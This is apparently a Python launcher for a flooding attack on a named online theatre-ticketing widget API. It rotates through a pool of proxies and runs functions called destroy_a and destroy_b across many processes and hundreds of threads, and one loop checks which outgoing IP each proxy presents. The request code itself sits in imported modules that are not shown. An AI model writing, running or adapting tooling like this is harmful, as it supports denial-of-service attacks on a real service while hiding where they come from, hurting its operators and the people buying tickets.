import itertools
import json
import multiprocessing
import os
import threading

from loguru import logger

from working_directory.notifiers.a_plan import load_events, destroy_a
from working_directory.notifiers.b_plan import load_landings, destroy_b
from parse_module.manager.proxy.loader import ManualProxies
import requests

events_path = os.path.join('notifiers', 'events.json')


def start_destroy_a(events_data):
    proxy_reqs = get_proxy_reqs('https://widget-api.afisha-mdtheatre.site/api/widget/5c08554b-5426-456f-9'
                                'f8a-9dc3dc8bc65f/ticket?lang=ru&currency=RUB&event=190047&is_landing=true')
    events = load_events(events_data, amount=5)

    logger.info(f'Starting...')
    pipes = []
    proc_num = multiprocessing.cpu_count()
    for channel in range(proc_num):
        parent_conn, child_conn = multiprocessing.Pipe()
        pipes.append(parent_conn)
        parameters = {
            'channel': channel + 1,
            'buffer_size': 2000,
            'print_step': 1,
            'threads': 1
        }
        args = (events, proxy_reqs, child_conn,)
        metaargs = (destroy_a, args, parameters,)
        thread = threading.Thread(target=threadizer, args=metaargs)
        thread.start()
        if parameters['print_step'] == 1:
            break

    for i, pipe in enumerate(pipes):
        pipe.recv()
    for pipe in pipes:
        pipe.send(None)


def get_proxy_reqs(url):
    proxy_hub.add_route(url)
    proxies = proxy_hub.get_all(url)
    proxy_reqs = [proxy.requests for proxy in proxies]
    logger.info(f'{len(proxy_reqs)} proxies loaded')
    return proxy_reqs


def start_destroy_b(events_data):
    proxy_reqs = get_proxy_reqs('https://widget-api.afisha-mdtheatre.site/api/widget/5c08554b-5426-456f-9'
                                'f8a-9dc3dc8bc65f/ticket?lang=ru&currency=RUB&event=190047&is_landing=true')

    events, event_weights = load_landings(events_data, amount=0, random=True)

    logger.info(f'Starting...')
    proc_num = 5
    pipes = []
    for channel in range(proc_num):
        parent_conn, child_conn = multiprocessing.Pipe()
        pipes.append(parent_conn)
        parameters = {
            'channel': channel + 1,
            'buffer_size': 120000,
            'print_step': 1000,
            'threads': 600
        }
        args = (events, event_weights, proxy_reqs, child_conn,)
        metaargs = (destroy_b, args, parameters,)
        thread = threading.Thread(target=threadizer, args=metaargs)
        thread.start()
        if parameters['print_step'] == 1:
            break

    for i, pipe in enumerate(pipes):
        pipe.recv()
    for pipe in pipes:
        pipe.send(None)


def start_destroy_ip(_):
    proxy_reqs = get_proxy_reqs('https://www.afisha.ru/wl/openapi/partners/54/city')
    proxy_loop = itertools.cycle(proxy_reqs)
    while True:
        ip = requests.get('http://httpbin.org/ip', proxies=next(proxy_loop)).json()['origin']
        print(ip)


def threadizer(func, args, kwargs):
    for cycle in range(200):
        kwargs['cycle'] = cycle
        p = multiprocessing.Process(target=func, args=args, kwargs=kwargs)
        p.start()
        logger.debug(f'Process started {kwargs["channel"]}')
        p.join()
        logger.debug(f'Process finished {kwargs["channel"]}')


if __name__ == '__main__':
    proxy_hub = ManualProxies('all_proxies.json')

    with open(events_path) as f:
        events_data = json.load(f)

    start_destroy_ip(events_data)
